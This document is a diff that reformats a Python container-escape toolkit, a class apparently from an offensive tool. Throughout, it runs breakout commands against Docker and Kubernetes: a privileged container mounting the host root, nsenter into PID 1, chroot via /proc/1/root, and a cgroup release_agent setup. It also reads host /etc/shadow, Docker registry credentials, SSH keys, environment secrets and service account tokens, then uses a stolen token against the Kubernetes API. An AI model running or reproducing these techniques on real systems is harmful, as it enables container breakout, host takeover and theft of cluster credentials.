@@ -8,12 +8,9 @@ Covers Docker, Kubernetes, and generic container breakout scenarios.
 """
 
 import subprocess
-import os
 import sys
 import json
-import shlex
-import tempfile
-from typing import Optional, Dict, Any, List, Tuple
+from typing import Dict, Any, List
 
 
 class ContainerEscape:
@@ -40,13 +37,7 @@ class ContainerEscape:
             Command output string or error message
         """
         try:
-            result = subprocess.run(
-                cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=timeout
-            )
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
             output = ""
             if result.stdout:
                 output += result.stdout
@@ -64,11 +55,7 @@ class ContainerEscape:
 
     def _log_result(self, technique: str, output: str, success: bool = True) -> None:
         """Log technique execution result."""
-        self.results.append({
-            "technique": technique,
-            "output": output,
-            "success": success
-        })
+        self.results.append({"technique": technique, "output": output, "success": success})
         self.techniques_executed.append(technique)
         if self.verbose:
             status = "[SUCCESS]" if success else "[FAILED]"
@@ -79,7 +66,7 @@ class ContainerEscape:
         checks = [
             "test -f /.dockerenv && echo 'docker' || echo 'not_docker'",
             "grep -q docker /proc/1/cgroup 2>/dev/null && echo 'cgroup_docker' || echo 'no_cgroup'",
-            "test -d /proc/1/ns && echo 'has_ns' || echo 'no_ns'"
+            "test -d /proc/1/ns && echo 'has_ns' || echo 'no_ns'",
         ]
         for check in checks:
             result = self.run_command(check)
@@ -120,9 +107,7 @@ class ContainerEscape:
             output_parts.append("[*] Attempting to create privileged escape container...")
 
             escape_cmd = (
-                f'docker run -d --name blacksentinel_escape '
-                f'--privileged -v /:/host '
-                f'alpine:latest sleep infinity'
+                "docker run -d --name blacksentinel_escape --privileged -v /:/host alpine:latest sleep infinity"
             )
             result = self.run_command(escape_cmd, timeout=60)
             output_parts.append(f"[*] Container creation: {result}")
@@ -162,7 +147,7 @@ class ContainerEscape:
             mount_result = self.run_command(
                 "mkdir -p /tmp/host_root && mount /dev/sda1 /tmp/host_root 2>/dev/null || "
                 "mount -t proc none /proc 2>/dev/null && echo 'mount_attempted'",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] Mount result: {mount_result}")
 
@@ -172,8 +157,7 @@ class ContainerEscape:
 
             output_parts.append("[*] Attempting chroot to host...")
             chroot_result = self.run_command(
-                "chroot /proc/1/root /bin/sh -c 'echo chroot_success; id; hostname' 2>/dev/null",
-                timeout=15
+                "chroot /proc/1/root /bin/sh -c 'echo chroot_success; id; hostname' 2>/dev/null", timeout=15
             )
             output_parts.append(f"[+] Chroot result: {chroot_result}")
 
@@ -199,9 +183,7 @@ class ContainerEscape:
             output_parts.append(f"[*] Potential mounts:\n{mounts}")
 
             output_parts.append("[*] Checking /proc/mounts for writable host paths...")
-            proc_mounts = self.run_command(
-                "cat /proc/mounts | grep -v 'proc\\|sys\\|dev\\|cgroup' | head -20"
-            )
+            proc_mounts = self.run_command("cat /proc/mounts | grep -v 'proc\\|sys\\|dev\\|cgroup' | head -20")
             output_parts.append(f"[*] Container mounts:\n{proc_mounts}")
 
             output_parts.append("[*] Attempting to access host filesystem via /proc...")
@@ -245,15 +227,12 @@ class ContainerEscape:
 
             output_parts.append("[*] Attempting PID namespace breakout...")
             pid_escape = self.run_command(
-                "nsenter -t 1 -m -u -i -n -p -- sh -c 'echo nsenter_escape_success; id' 2>/dev/null",
-                timeout=15
+                "nsenter -t 1 -m -u -i -n -p -- sh -c 'echo nsenter_escape_success; id' 2>/dev/null", timeout=15
             )
             output_parts.append(f"[+] nsenter result: {pid_escape}")
 
             output_parts.append("[*] Checking for ptrace access...")
-            ptrace_check = self.run_command(
-                "cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null"
-            )
+            ptrace_check = self.run_command("cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null")
             output_parts.append(f"[*] Ptrace scope: {ptrace_check}")
 
             output_parts.append("[*] Reading host cmdline...")
@@ -282,22 +261,18 @@ class ContainerEscape:
             output_parts.append(f"[*] Cgroup entries:\n{cgroup_info}")
 
             output_parts.append("[*] Reading device capabilities...")
-            device_info = self.run_command(
-                "cat /sys/fs/cgroup/devices/devices.list 2>/dev/null | head -20"
-            )
+            device_info = self.run_command("cat /sys/fs/cgroup/devices/devices.list 2>/dev/null | head -20")
             output_parts.append(f"[*] Device list:\n{device_info}")
 
             output_parts.append("[*] Checking for writable sysfs entries...")
-            writable = self.run_command(
-                "find /sys -writable -type f 2>/dev/null | head -20"
-            )
+            writable = self.run_command("find /sys -writable -type f 2>/dev/null | head -20")
             output_parts.append(f"[*] Writable sysfs files:\n{writable}")
 
             output_parts.append("[*] Attempting sysfs-based privilege escalation...")
             sys_escape = self.run_command(
                 "echo 'device cgroup breakout attempt' && "
                 "cat /sys/fs/cgroup/devices/docker/*/devices.list 2>/dev/null | head -5",
-                timeout=15
+                timeout=15,
             )
             output_parts.append(f"[*] Cgroup escape attempt: {sys_escape}")
 
@@ -328,9 +303,7 @@ class ContainerEscape:
             if "mounted" in mount_result:
                 self.run_command("mkdir -p /tmp/cgrp/x")
                 self.run_command("echo 1 > /tmp/cgrp/x/notify_on_release")
-                host_path = self.run_command(
-                    "cat /proc/self/cgroup | grep 'pids' | cut -d: -f3"
-                )
+                host_path = self.run_command("cat /proc/self/cgroup | grep 'pids' | cut -d: -f3")
                 output_parts.append(f"[*] Cgroup path: {host_path}")
 
                 escape_cmd = (
@@ -343,15 +316,11 @@ class ContainerEscape:
                 output_parts.append("[*] Release agent configured")
 
             output_parts.append("[*] Attempting alt escape via cgroup namespace...")
-            alt_escape = self.run_command(
-                "cat /proc/self/cgroup | head -10",
-                timeout=15
-            )
+            alt_escape = self.run_command("cat /proc/self/cgroup | head -10", timeout=15)
             output_parts.append(f"[*] Cgroup info:\n{alt_escape}")
 
             ns_escape = self.run_command(
-                "nsenter --cgroup=/proc/1/ns/cgroup -- cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '",
-                timeout=15
+                "nsenter --cgroup=/proc/1/ns/cgroup -- cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '", timeout=15
             )
             output_parts.append(f"[+] Cgroup nsenter: {ns_escape}")
 
@@ -378,30 +347,22 @@ class ContainerEscape:
 
             output_parts.append("[*] Attempting nsenter to host PID namespace...")
             pid_escape = self.run_command(
-                "nsenter -t 1 -p -m -- sh -c 'echo nsenter_pid_success; ps aux | head -10' 2>/dev/null",
-                timeout=20
+                "nsenter -t 1 -p -m -- sh -c 'echo nsenter_pid_success; ps aux | head -10' 2>/dev/null", timeout=20
             )
             output_parts.append(f"[+] PID nsenter:\n{pid_escape}")
 
             output_parts.append("[*] Attempting full namespace nsenter...")
             full_escape = self.run_command(
-                "nsenter -t 1 -m -u -i -n -p -- sh -c 'echo full_nsenter_success; id; hostname' 2>/dev/null",
-                timeout=20
+                "nsenter -t 1 -m -u -i -n -p -- sh -c 'echo full_nsenter_success; id; hostname' 2>/dev/null", timeout=20
             )
             output_parts.append(f"[+] Full nsenter:\n{full_escape}")
 
             output_parts.append("[*] Attempting mount namespace escape...")
-            mount_escape = self.run_command(
-                "nsenter -t 1 -m -- ls / 2>/dev/null | head -15",
-                timeout=15
-            )
+            mount_escape = self.run_command("nsenter -t 1 -m -- ls / 2>/dev/null | head -15", timeout=15)
             output_parts.append(f"[+] Mount namespace root:\n{mount_escape}")
 
             output_parts.append("[*] Reading host /etc/passwd...")
-            host_passwd = self.run_command(
-                "nsenter -t 1 -m -- cat /etc/passwd 2>/dev/null | head -5",
-                timeout=15
-            )
+            host_passwd = self.run_command("nsenter -t 1 -m -- cat /etc/passwd 2>/dev/null | head -5", timeout=15)
             output_parts.append(f"[+] Host passwd:\n{host_passwd}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -422,15 +383,11 @@ class ContainerEscape:
             output_parts.append(f"[*] Capabilities:\n{caps}")
 
             output_parts.append("[*] Decoding capabilities...")
-            cap_hex = self.run_command(
-                "grep CapEff /proc/1/status | awk '{print $2}'"
-            )
+            cap_hex = self.run_command("grep CapEff /proc/1/status | awk '{print $2}'")
             output_parts.append(f"[*] Effective caps (hex): {cap_hex}")
 
             output_parts.append("[*] Checking for CAP_SYS_ADMIN...")
-            sys_admin = self.run_command(
-                "capsh --print 2>/dev/null | grep -i 'current' || echo 'capsh unavailable'"
-            )
+            sys_admin = self.run_command("capsh --print 2>/dev/null | grep -i 'current' || echo 'capsh unavailable'")
             output_parts.append(f"[*] Capabilities (capsh): {sys_admin}")
 
             output_parts.append("[*] Attempting capability-based escape...")
@@ -452,9 +409,7 @@ class ContainerEscape:
             output_parts.append(f"[*] Mknod check: {mknod_check}")
 
             output_parts.append("[*] Checking for CAP_SETUID/CAP_SETGID...")
-            suid_check = self.run_command(
-                "su -c 'echo suid_test' root 2>/dev/null || echo 'su_failed'"
-            )
+            suid_check = self.run_command("su -c 'echo suid_test' root 2>/dev/null || echo 'su_failed'")
             output_parts.append(f"[*] SUID check: {suid_check}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -479,22 +434,16 @@ class ContainerEscape:
             output_parts.append(f"[*] Block devices: {block_devs}")
 
             output_parts.append("[*] Checking /dev/mem access...")
-            mem_check = self.run_command(
-                "test -r /dev/mem && echo 'mem_readable' || echo 'mem_not_readable'"
-            )
+            mem_check = self.run_command("test -r /dev/mem && echo 'mem_readable' || echo 'mem_not_readable'")
             output_parts.append(f"[*] /dev/mem: {mem_check}")
 
             output_parts.append("[*] Checking /dev/sda access...")
-            sda_check = self.run_command(
-                "test -r /dev/sda && echo 'sda_readable' || echo 'sda_not_readable'"
-            )
+            sda_check = self.run_command("test -r /dev/sda && echo 'sda_readable' || echo 'sda_not_readable'")
             output_parts.append(f"[*] /dev/sda: {sda_check}")
 
             if "sda_readable" in sda_check:
                 output_parts.append("[+] /dev/sda is readable - attempting escape...")
-                sda_read = self.run_command(
-                    "dd if=/dev/sda bs=512 count=1 2>/dev/null | xxd | head -10"
-                )
+                sda_read = self.run_command("dd if=/dev/sda bs=512 count=1 2>/dev/null | xxd | head -10")
                 output_parts.append(f"[+] SDA first sector:\n{sda_read}")
 
             output_parts.append("[*] Checking /dev/mapper for LVM...")
@@ -502,9 +451,7 @@ class ContainerEscape:
             output_parts.append(f"[*] LVM devices: {mapper}")
 
             output_parts.append("[*] Checking TTY devices for host access...")
-            tty_check = self.run_command(
-                "ls -la /dev/tty* 2>/dev/null | head -10"
-            )
+            tty_check = self.run_command("ls -la /dev/tty* 2>/dev/null | head -10")
             output_parts.append(f"[*] TTY devices: {tty_check}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -531,7 +478,7 @@ class ContainerEscape:
                 "mount /dev/xvda1 /tmp/host 2>/dev/null && echo 'mount_xvda1' || "
                 "mount -t ext4 /dev/sda1 /tmp/host 2>/dev/null && echo 'mount_ext4' || "
                 "echo 'direct_mount_failed'",
-                timeout=30
+                timeout=30,
             )
             output_parts.append(f"[*] Mount result: {mount_result}")
 
@@ -542,15 +489,11 @@ class ContainerEscape:
             output_parts.append(f"[*] Proc mount: {proc_mount}")
 
             output_parts.append("[*] Checking for loop devices...")
-            loop_check = self.run_command(
-                "losetup -a 2>/dev/null || echo 'losetup unavailable'"
-            )
+            loop_check = self.run_command("losetup -a 2>/dev/null || echo 'losetup unavailable'")
             output_parts.append(f"[*] Loop devices: {loop_check}")
 
             output_parts.append("[*] Attempting disk partition discovery...")
-            part_info = self.run_command(
-                "fdisk -l 2>/dev/null | head -20 || parted -l 2>/dev/null | head -10"
-            )
+            part_info = self.run_command("fdisk -l 2>/dev/null | head -20 || parted -l 2>/dev/null | head -10")
             output_parts.append(f"[*] Disk info:\n{part_info}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -581,16 +524,14 @@ class ContainerEscape:
             output_parts.append(f"[*] Runc path: {runc_path}")
 
             output_parts.append("[*] Checking /proc/self/exe for current process...")
-            proc_exe = self.run_command(
-                "ls -la /proc/self/exe 2>/dev/null"
-            )
+            proc_exe = self.run_command("ls -la /proc/self/exe 2>/dev/null")
             output_parts.append(f"[*] Process exe: {proc_exe}")
 
             output_parts.append("[*] Attempting runc exploit preparation...")
             exploit_prep = self.run_command(
                 "mkdir -p /tmp/exploit && echo '#!/bin/bash' > /tmp/exploit/payload.sh && "
                 "echo 'cat /etc/shadow > /proc/self/root/etc/shadow' >> /tmp/exploit/payload.sh",
-                timeout=10
+                timeout=10,
             )
             output_parts.append(f"[*] Exploit prep: {exploit_prep}")
 
@@ -617,7 +558,7 @@ class ContainerEscape:
             socket_paths = [
                 "/run/containerd/containerd.sock",
                 "/var/run/containerd/containerd.sock",
-                "/run/containerd.sock"
+                "/run/containerd.sock",
             ]
             found_socket = None
             for path in socket_paths:
@@ -631,9 +572,7 @@ class ContainerEscape:
                 output_parts.append("[!] No containerd socket found")
 
             output_parts.append("[*] Checking containerd socket permissions...")
-            socket_perms = self.run_command(
-                "ls -la /run/containerd/containerd.sock 2>/dev/null"
-            )
+            socket_perms = self.run_command("ls -la /run/containerd/containerd.sock 2>/dev/null")
             output_parts.append(f"[*] Socket permissions: {socket_perms}")
 
             output_parts.append("[*] Attempting ctr connection...")
@@ -643,15 +582,11 @@ class ContainerEscape:
             output_parts.append(f"[*] Ctr version: {ctr_check}")
 
             output_parts.append("[*] Listing containerd containers...")
-            containers = self.run_command(
-                "ctr -a /run/containerd/containerd.sock containers ls 2>/dev/null | head -10"
-            )
+            containers = self.run_command("ctr -a /run/containerd/containerd.sock containers ls 2>/dev/null | head -10")
             output_parts.append(f"[*] Containers: {containers}")
 
             output_parts.append("[*] Checking nerdctl availability...")
-            nerdctl = self.run_command(
-                "nerdctl --version 2>/dev/null || echo 'nerdctl not available'"
-            )
+            nerdctl = self.run_command("nerdctl --version 2>/dev/null || echo 'nerdctl not available'")
             output_parts.append(f"[*] Nerdctl: {nerdctl}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -668,40 +603,28 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking overlay filesystem...")
-            overlay_check = self.run_command(
-                "mount | grep overlay"
-            )
+            overlay_check = self.run_command("mount | grep overlay")
             output_parts.append(f"[*] Overlay mounts:\n{overlay_check}")
 
             output_parts.append("[*] Inspecting overlay layers...")
-            overlay_dirs = self.run_command(
-                "cat /proc/mounts | grep overlay"
-            )
+            overlay_dirs = self.run_command("cat /proc/mounts | grep overlay")
             output_parts.append(f"[*] Overlay configuration:\n{overlay_dirs}")
 
             output_parts.append("[*] Checking overlay upperdir...")
-            upperdir = self.run_command(
-                "cat /proc/mounts | grep overlay | grep -oP 'upperdir=\\K[^,]+' 2>/dev/null"
-            )
+            upperdir = self.run_command("cat /proc/mounts | grep overlay | grep -oP 'upperdir=\\K[^,]+' 2>/dev/null")
             output_parts.append(f"[*] Upper directory: {upperdir}")
 
             output_parts.append("[*] Checking overlay workdir...")
-            workdir = self.run_command(
-                "cat /proc/mounts | grep overlay | grep -oP 'workdir=\\K[^,]+' 2>/dev/null"
-            )
+            workdir = self.run_command("cat /proc/mounts | grep overlay | grep -oP 'workdir=\\K[^,]+' 2>/dev/null")
             output_parts.append(f"[*] Work directory: {workdir}")
 
             output_parts.append("[*] Attempting to access host via overlay...")
             if upperdir and upperdir != "":
-                host_access = self.run_command(
-                    f"ls -la {upperdir}/../ 2>/dev/null | head -10"
-                )
+                host_access = self.run_command(f"ls -la {upperdir}/../ 2>/dev/null | head -10")
                 output_parts.append(f"[+] Overlay parent access:\n{host_access}")
 
             output_parts.append("[*] Checking for overlay escape via lowerdir...")
-            lowerdir = self.run_command(
-                "cat /proc/mounts | grep overlay | grep -oP 'lowerdir=\\K[^,]+' 2>/dev/null"
-            )
+            lowerdir = self.run_command("cat /proc/mounts | grep overlay | grep -oP 'lowerdir=\\K[^,]+' 2>/dev/null")
             output_parts.append(f"[*] Lower directory: {lowerdir}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -718,39 +641,27 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking PID namespace isolation...")
-            pid_check = self.run_command(
-                "ls -la /proc/ 2>/dev/null | grep -E '^[0-9]+$' | wc -l"
-            )
+            pid_check = self.run_command("ls -la /proc/ 2>/dev/null | grep -E '^[0-9]+$' | wc -l")
             output_parts.append(f"[*] Visible PIDs: {pid_check}")
 
             output_parts.append("[*] Checking for host PID namespace sharing...")
-            ns_pid = self.run_command(
-                "ls -la /proc/1/ns/pid 2>/dev/null"
-            )
+            ns_pid = self.run_command("ls -la /proc/1/ns/pid 2>/dev/null")
             output_parts.append(f"[*] PID namespace: {ns_pid}")
 
             output_parts.append("[*] Reading init process info...")
-            init_info = self.run_command(
-                "cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '"
-            )
+            init_info = self.run_command("cat /proc/1/cmdline 2>/dev/null | tr '\\0' ' '")
             output_parts.append(f"[*] Init process: {init_info}")
 
             output_parts.append("[*] Attempting host PID access...")
-            host_pids = self.run_command(
-                "ls /proc/ | grep -E '^[0-9]+$' | sort -n | tail -20"
-            )
+            host_pids = self.run_command("ls /proc/ | grep -E '^[0-9]+$' | sort -n | tail -20")
             output_parts.append(f"[*] Available PIDs:\n{host_pids}")
 
             output_parts.append("[*] Checking for host processes visible...")
-            ps_check = self.run_command(
-                "ps aux 2>/dev/null | head -20 || ps -ef 2>/dev/null | head -20"
-            )
+            ps_check = self.run_command("ps aux 2>/dev/null | head -20 || ps -ef 2>/dev/null | head -20")
             output_parts.append(f"[*] Process list:\n{ps_check}")
 
             output_parts.append("[*] Attempting to read host process namespaces...")
-            host_ns = self.run_command(
-                "readlink /proc/1/ns/mnt 2>/dev/null"
-            )
+            host_ns = self.run_command("readlink /proc/1/ns/mnt 2>/dev/null")
             output_parts.append(f"[*] Init mount namespace: {host_ns}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -777,27 +688,19 @@ class ContainerEscape:
             output_parts.append(f"[*] Docker secrets:\n{docker_secrets}")
 
             output_parts.append("[*] Reading Docker config files...")
-            docker_config = self.run_command(
-                "cat /etc/docker/daemon.json 2>/dev/null || echo 'no_docker_config'"
-            )
+            docker_config = self.run_command("cat /etc/docker/daemon.json 2>/dev/null || echo 'no_docker_config'")
             output_parts.append(f"[*] Docker config:\n{docker_config}")
 
             output_parts.append("[*] Checking for registry credentials...")
-            registry_creds = self.run_command(
-                "cat /root/.docker/config.json 2>/dev/null | head -20"
-            )
+            registry_creds = self.run_command("cat /root/.docker/config.json 2>/dev/null | head -20")
             output_parts.append(f"[*] Registry creds:\n{registry_creds}")
 
             output_parts.append("[*] Checking for SSH keys...")
-            ssh_keys = self.run_command(
-                "ls -la /root/.ssh/ 2>/dev/null || ls -la /home/*/.ssh/ 2>/dev/null"
-            )
+            ssh_keys = self.run_command("ls -la /root/.ssh/ 2>/dev/null || ls -la /home/*/.ssh/ 2>/dev/null")
             output_parts.append(f"[*] SSH keys: {ssh_keys}")
 
             output_parts.append("[*] Checking for API tokens...")
-            api_tokens = self.run_command(
-                "env | grep -iE '(token|key|secret|password|api)' 2>/dev/null"
-            )
+            api_tokens = self.run_command("env | grep -iE '(token|key|secret|password|api)' 2>/dev/null")
             output_parts.append(f"[*] API tokens:\n{api_tokens}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -822,9 +725,7 @@ class ContainerEscape:
             output_parts.append(f"[*] Current mounts:\n{mount_info}")
 
             output_parts.append("[*] Checking /host access...")
-            host_check = self.run_command(
-                "ls -la /host/ 2>/dev/null | head -15 || echo 'no /host mount'"
-            )
+            host_check = self.run_command("ls -la /host/ 2>/dev/null | head -15 || echo 'no /host mount'")
             output_parts.append(f"[*] Host access:\n{host_check}")
 
             output_parts.append("[*] Checking common hostPath mount points...")
@@ -840,15 +741,12 @@ class ContainerEscape:
 
             output_parts.append("[*] Reading host /etc/shadow via hostPath...")
             shadow = self.run_command(
-                "cat /host/etc/shadow 2>/dev/null | head -5 || "
-                "cat /proc/1/root/etc/shadow 2>/dev/null | head -5"
+                "cat /host/etc/shadow 2>/dev/null | head -5 || cat /proc/1/root/etc/shadow 2>/dev/null | head -5"
             )
             output_parts.append(f"[+] Shadow:\n{shadow}")
 
             output_parts.append("[*] Listing host /etc/kubernetes...")
-            k8s_config = self.run_command(
-                "ls -la /host/etc/kubernetes/ 2>/dev/null | head -15"
-            )
+            k8s_config = self.run_command("ls -la /host/etc/kubernetes/ 2>/dev/null | head -15")
             output_parts.append(f"[+] K8s config:\n{k8s_config}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -889,16 +787,11 @@ class ContainerEscape:
             output_parts.append(f"[*] Mount result: {mount_result}")
 
             output_parts.append("[*] Checking for node access...")
-            node_access = self.run_command(
-                "cat /etc/hostname 2>/dev/null"
-            )
+            node_access = self.run_command("cat /etc/hostname 2>/dev/null")
             output_parts.append(f"[*] Node hostname: {node_access}")
 
             output_parts.append("[*] Attempting privileged command execution...")
-            priv_exec = self.run_command(
-                "nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname' 2>/dev/null",
-                timeout=15
-            )
+            priv_exec = self.run_command("nsenter -t 1 -m -u -i -n -p -- sh -c 'id; hostname' 2>/dev/null", timeout=15)
             output_parts.append(f"[+] Privileged exec:\n{priv_exec}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -919,9 +812,7 @@ class ContainerEscape:
             output_parts.append(f"[*] PID namespace: {ns_pid}")
 
             output_parts.append("[*] Listing visible processes...")
-            processes = self.run_command(
-                "ps aux 2>/dev/null | head -20 || ps -ef 2>/dev/null | head -20"
-            )
+            processes = self.run_command("ps aux 2>/dev/null | head -20 || ps -ef 2>/dev/null | head -20")
             output_parts.append(f"[*] Process list:\n{processes}")
 
             output_parts.append("[*] Checking init process identity...")
@@ -929,24 +820,17 @@ class ContainerEscape:
             output_parts.append(f"[*] Init command: {init_cmd}")
 
             output_parts.append("[*] Attempting host PID namespace access...")
-            host_pids = self.run_command(
-                "ls /proc/ | grep -E '^[0-9]+$' | sort -n | head -30"
-            )
+            host_pids = self.run_command("ls /proc/ | grep -E '^[0-9]+$' | sort -n | head -30")
             output_parts.append(f"[*] Available PIDs:\n{host_pids}")
 
             output_parts.append("[*] Reading host process cmdline...")
             for pid in ["1", "2", "100", "1000"]:
-                cmdline = self.run_command(
-                    f"cat /proc/{pid}/cmdline 2>/dev/null | tr '\\0' ' '"
-                )
+                cmdline = self.run_command(f"cat /proc/{pid}/cmdline 2>/dev/null | tr '\\0' ' '")
                 if cmdline and "cat:" not in cmdline:
                     output_parts.append(f"[*] PID {pid}: {cmdline}")
 
             output_parts.append("[*] Attempting nsenter with host PID...")
-            nsenter_result = self.run_command(
-                "nsenter -t 1 -p -- sh -c 'ps aux | head -10' 2>/dev/null",
-                timeout=15
-            )
+            nsenter_result = self.run_command("nsenter -t 1 -p -- sh -c 'ps aux | head -10' 2>/dev/null", timeout=15)
             output_parts.append(f"[+] Host PID nsenter:\n{nsenter_result}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -967,33 +851,23 @@ class ContainerEscape:
             output_parts.append(f"[*] Network namespace: {ns_net}")
 
             output_parts.append("[*] Checking network interfaces...")
-            interfaces = self.run_command(
-                "ip addr 2>/dev/null || ifconfig 2>/dev/null | head -30"
-            )
+            interfaces = self.run_command("ip addr 2>/dev/null || ifconfig 2>/dev/null | head -30")
             output_parts.append(f"[*] Interfaces:\n{interfaces}")
 
             output_parts.append("[*] Checking for kubelet API access...")
-            kubelet_check = self.run_command(
-                "curl -sk https://127.0.0.1:10250/healthz 2>/dev/null"
-            )
+            kubelet_check = self.run_command("curl -sk https://127.0.0.1:10250/healthz 2>/dev/null")
             output_parts.append(f"[*] Kubelet health: {kubelet_check}")
 
             output_parts.append("[*] Checking for API server access...")
-            api_check = self.run_command(
-                "curl -sk https://kubernetes.default.svc:443/version 2>/dev/null"
-            )
+            api_check = self.run_command("curl -sk https://kubernetes.default.svc:443/version 2>/dev/null")
             output_parts.append(f"[*] API server: {api_check}")
 
             output_parts.append("[*] Checking for host network services...")
-            host_ports = self.run_command(
-                "netstat -tlnp 2>/dev/null | head -20 || ss -tlnp 2>/dev/null | head -20"
-            )
+            host_ports = self.run_command("netstat -tlnp 2>/dev/null | head -20 || ss -tlnp 2>/dev/null | head -20")
             output_parts.append(f"[*] Host ports:\n{host_ports}")
 
             output_parts.append("[*] Checking for DNS resolution...")
-            dns_check = self.run_command(
-                "cat /etc/resolv.conf 2>/dev/null"
-            )
+            dns_check = self.run_command("cat /etc/resolv.conf 2>/dev/null")
             output_parts.append(f"[*] DNS config:\n{dns_check}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1014,33 +888,23 @@ class ContainerEscape:
             output_parts.append(f"[*] IPC namespace: {ns_ipc}")
 
             output_parts.append("[*] Checking System V IPC...")
-            ipc_info = self.run_command(
-                "ipcs 2>/dev/null | head -20"
-            )
+            ipc_info = self.run_command("ipcs 2>/dev/null | head -20")
             output_parts.append(f"[*] IPC info:\n{ipc_info}")
 
             output_parts.append("[*] Checking shared memory segments...")
-            shm_info = self.run_command(
-                "ipcs -m 2>/dev/null | head -20"
-            )
+            shm_info = self.run_command("ipcs -m 2>/dev/null | head -20")
             output_parts.append(f"[*] Shared memory:\n{shm_info}")
 
             output_parts.append("[*] Checking semaphores...")
-            sem_info = self.run_command(
-                "ipcs -s 2>/dev/null | head -20"
-            )
+            sem_info = self.run_command("ipcs -s 2>/dev/null | head -20")
             output_parts.append(f"[*] Semaphores:\n{sem_info}")
 
             output_parts.append("[*] Checking message queues...")
-            msg_info = self.run_command(
-                "ipcs -q 2>/dev/null | head -20"
-            )
+            msg_info = self.run_command("ipcs -q 2>/dev/null | head -20")
             output_parts.append(f"[*] Message queues:\n{msg_info}")
 
             output_parts.append("[*] Attempting to read host IPC data...")
-            ipc_read = self.run_command(
-                "cat /proc/1/ipc/shm 2>/dev/null || echo 'shm_not_accessible'"
-            )
+            ipc_read = self.run_command("cat /proc/1/ipc/shm 2>/dev/null || echo 'shm_not_accessible'")
             output_parts.append(f"[*] IPC SHM read: {ipc_read}")
 
             self._log_result(technique, "\n".join(output_parts))
@@ -1057,32 +921,26 @@ class ContainerEscape:
             output_parts = []
 
             output_parts.append("[*] Checking for mounted service account token...")
-            sa_token = self.run_command(
-                "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -1"
-            )
+            sa_token = self.run_command("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -1")
             if sa_token and len(sa_token) > 50:
                 output_parts.append(f"[+] Service account token found (length: {len(sa_token)})")
             else:
                 output_parts.append("[-] No service account token found")
 
             output_parts.append("[*] Checking service account namespace...")
-            sa_ns = self.run_command(
-                "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null"
-            )
+            sa_ns = self.run_command("cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null")
             output_parts.append(f"[*] Namespace: {sa_ns}")
 
             output_parts.append("[*] Checking service account CA cert...")
-            sa_ca = self.run_command(
-                "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -3"
-            )
+            sa_ca = self.run_command("cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -3")
             output_parts.append(f"[*] CA cert present: {'yes' if sa_ca else 'no'}")
 
             if sa_token and len(sa_token) > 50:
                 output_parts.append("[*] Testing API access with service account token...")
                 api_test = self.run_command(
                     f'curl -sk -H "Authorization: Bearer {sa_token}" '
-                    f'https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -5',
-                    timeout=15
+                    f"https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -5",
+                    timeout=15,
                 )
                 output_parts.append(f"[*] API response:\n{api_test}")
 
@@ -1094,9 +952,9 @@ class ContainerEscape:
                 )
                 perm_check = self.run_command(
                     f'curl -sk -H "Authorization: Bearer {sa_token}" '
-                    f'https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreview '
-                    f'--header "Content-Type: application/json" -d \'{json_body}\' 2>/dev/null',
-                    timeout=15
+                    f"https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreview "
+                    f"--header \"Content-Type: application/json\" -d '{json_body}' 2>/dev/null",
+                    timeout=15,
                 )
                 output_parts.append(f"[*] Permission check:\n{perm_check}")
 
@@ -1126,21 +984,15 @@ class ContainerEscape:
             output_parts.append(f"[*] Kubeconfig: {kubeconfig}")
 
             output_parts.append("[*] Checking for in-cluster kubectl access...")
-            kubectl_cluster = self.run_command(
-                "kubectl cluster-info 2>/dev/null || echo 'kubectl_cluster_failed'"
-            )
+            kubectl_cluster = self.run_command("kubectl cluster-info 2>/dev/null || echo 'kubectl_cluster_failed'")
             output_parts.append(f"[*] Cluster info: {kubectl_cluster}")
 
             output_parts.append("[*] Listing available pods...")
-            pods = self.run_command(
-                "kubectl get pods --all-namespaces 2>/dev/null | head -20"
-            )
+            pods = self.run_command("kubectl get pods --all-namespaces 2>/dev/null | head -20")
             output_parts.append(f"[*] Pods:\n{pods}")
 
             output_parts.append("[*] Checking for node exec capabilities...")
-            node_exec = self.run_command(
-                "kubectl get nodes 2>/dev/null | head -10"
-            )
+            node_exec = self.run_command("kubectl get nodes 2>/dev/null | head -10")
             output_parts.append(f"[*] Nodes: {node_exec}")
 
             output_parts.append("[*] Attempting kubectl exec to host...")
@@ -1148,7 +1000,7 @@ class ContainerEscape:
                 "kubectl exec --namespace kube-system $(kubectl get pods --namespace kube-system "
                 "-l component=kube-controller-manager -o name 2>/dev/null | head -1) "
                 "-- ls / 2>/dev/null | head -10",
-                timeout=30
+                timeout=30,
             )
             output_parts.append(f"[*] Kubectl exec: {exec_result}")
 
